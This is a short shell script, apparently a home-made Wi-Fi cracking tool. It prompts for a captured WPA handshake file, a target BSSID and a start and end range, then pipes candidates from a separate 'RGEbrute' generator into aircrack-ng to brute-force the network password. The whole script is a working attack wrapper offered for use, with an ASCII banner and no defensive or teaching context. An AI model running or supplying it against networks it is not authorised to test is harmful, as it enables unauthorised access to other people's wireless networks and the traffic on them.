#!/bin/sh

chmod a+x RGEbrute
echo "      _______   _______   _______   _______   _______"
echo "     /  __  /  /   ___/  /  ____/  /   _  /  /  ____/" 
echo "    / /__/ /  /   /     /  /___   /  /_/ /  /  /__"
echo "   / /  __/  /  _/__   /  ____/  /  ____/  /  ___/"
echo "  / / \ \   /  /_  /  /  /      /   _ \   /  /"
echo " / /   \ \ /      /  /  /____  /  /_/ /  /  /"
echo "/ /     \ \ _____/  /_______/ /______/  /__/"
echo "\n\tCreate by Rovoaries G Estraiw"

echo "\n\t[Ex. /root/desktop/001.cap ]"
echo -n "\tPath handshake file: "
read handshake
echo -n "\tEnter Bssid : "
read bssid
echo -n "\tStart lenge : "
read start
echo -n "\tEnd lenge : "
read end

clear

echo "      _______   _______   _______   _______   _______"
echo "     /  __  /  /   ___/  /  ____/  /   _  /  /  ____/" 
echo "    / /__/ /  /   /     /  /___   /  /_/ /  /  /__"
echo "   / /  __/  /  _/__   /  ____/  /  ____/  /  ___/"
echo "  / / \ \   /  /_  /  /  /      /   _ \   /  /"
echo " / /   \ \ /      /  /  /____  /  /_/ /  /  /"
echo "/ /     \ \ _____/  /_______/ /______/  /__/"

echo "\n\tCreate by Rovoaries G Estraiw"
echo "\tPath handshake file path : $handshake"
echo "\tEnter Bssid : $bssid"
echo "\tStart lenge : $start"
echo "\tEnd lenge : $end"

echo "\t[*] Check your information........."
sleep 5
echo "\t[!] Start now!"
sleep 2

./RGEbrute $start $end | aircrack-ng $handshake --bssid $bssid -w -

clear
